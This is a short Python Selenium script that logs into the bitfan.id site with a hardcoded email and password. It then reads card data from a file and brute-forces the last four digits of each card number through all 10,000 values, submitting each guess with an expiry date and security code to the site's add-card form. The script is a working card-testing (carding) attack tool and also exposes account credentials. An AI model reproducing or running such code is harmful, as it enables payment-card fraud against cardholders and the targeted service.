from selenium import webdriver
from time import sleep
driver = webdriver.Chrome(executable_path='chromedriver.exe')
driver.get('https://bitfan.id/users/sign_in')
# 登陆
email = "document.getElementById('login_user_email').value = 'sauyq89621@yahoo.co.jp'"
password = "document.getElementById('login_user_password').value = 'Anaida123'"
label = "document.getElementsByClassName('label-text')[0].click()"
login = "document.getElementsByClassName('btn btn-primary btn-block btn-lg')[2].click()"
driver.execute_script(email)
driver.execute_script(password)
driver.execute_script(label)
sleep(2)
driver.execute_script(login)
sleep(2)

driver.get('https://bitfan.id/mypage/settings/cards/new')


def get_full_count(num):
    x = str(num)
    for i in range(0, 4 - len(str(num))):
        x = '0' + x
    return x


# input
input_0 = "document.getElementsByClassName('form-control')[0].value = '{}'"
input_1 = "document.getElementsByClassName('form-control')[1].value = '{}'"
input_2 = "document.getElementsByClassName('form-control')[2].value = '{}'"
input_3 = "document.getElementsByClassName('form-control')[3].value = '{}'"
f = open('info.txt')
lines = f.readlines()
print('')
# input()
for line in lines:
    item = list(filter(lambda s: s != '', line.split(' ')))
    for i in range(0, 9999):
        card = item[0][0:-4] + get_full_count(i)
        date_1 = item[1][0:2]
        date_2 = '20' + item[1][2:]
        code = item[2][0:-1]
        print(card, date_1, date_2, code)
        driver.execute_script(input_0.format(card))
        driver.execute_script(input_1.format(date_1))
        driver.execute_script(input_2.format(date_2))
        driver.execute_script(input_3.format(code))
        sleep(0.5)
        driver.execute_script("document.getElementsByName('commit')[0].click()")
        sleep(0.5)
        current_url = driver.current_url
        print(current_url)
        driver.get('https://bitfan.id/mypage/settings/cards/new')
f.close()





